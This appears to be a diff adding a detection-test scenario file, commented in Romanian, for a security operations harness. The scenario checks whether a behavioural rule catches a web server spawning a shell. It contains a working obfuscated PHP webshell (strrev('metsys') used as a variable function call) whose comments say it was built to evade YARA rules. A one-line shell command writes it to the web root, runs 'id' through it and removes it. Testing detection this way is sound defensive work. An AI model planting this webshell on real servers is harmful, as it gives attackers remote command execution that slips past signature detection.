@@ -1,0 +1,18 @@
+# Scenariu 0-day: webshell OFUSCAT care evadeaza regulile YARA (sensor de semnatura),
+# dar tot executa comenzi prin serverul web. Esenta unui 0-day pentru detectie: NICIO
+# semnatura nu-l prinde, deci singurul strat care-l mai poate prinde e cel COMPORTAMENTAL
+# (RCE: Web server spawns shell - lantul apache2 -> shell -> comanda, indiferent de continut).
+#
+# Webshell-ul: $b = strrev("metsys") -> "system"; $b($_GET["q"]) = apel functie-variabila.
+# NU contine "system(" literal langa $_GET, NU contine eval(base64...), NU are markeri de
+# shell cunoscut -> toate regulile din webshells.yar raman oarbe. La apel: apache2 -> sh ->
+# id, care trebuie prins de regula comportamentala de endpoint.
+#
+# Asteptare: ground_truth=attack. Daca SOC-ul il prinde comportamental, stratul isi merita
+# existenta pe 0-day. Daca nu, e un gol real (si scenariul merge in setul de validare).
+scenarios:
+  - name: "0-day RCE - webshell ofuscat (YARA orb) ruleaza id"
+    path: fast
+    ground_truth: attack
+    rule_name: "RCE: Web server spawns shell"
+    generate: 'printf "%s" "<?php \$a=\$_GET[\"q\"]; \$b=strrev(\"metsys\"); \$b(\$a); ?>" | sudo tee /var/www/html/zd.php >/dev/null && curl -s "http://localhost/zd.php?q=id" >/dev/null && sudo rm -f /var/www/html/zd.php'
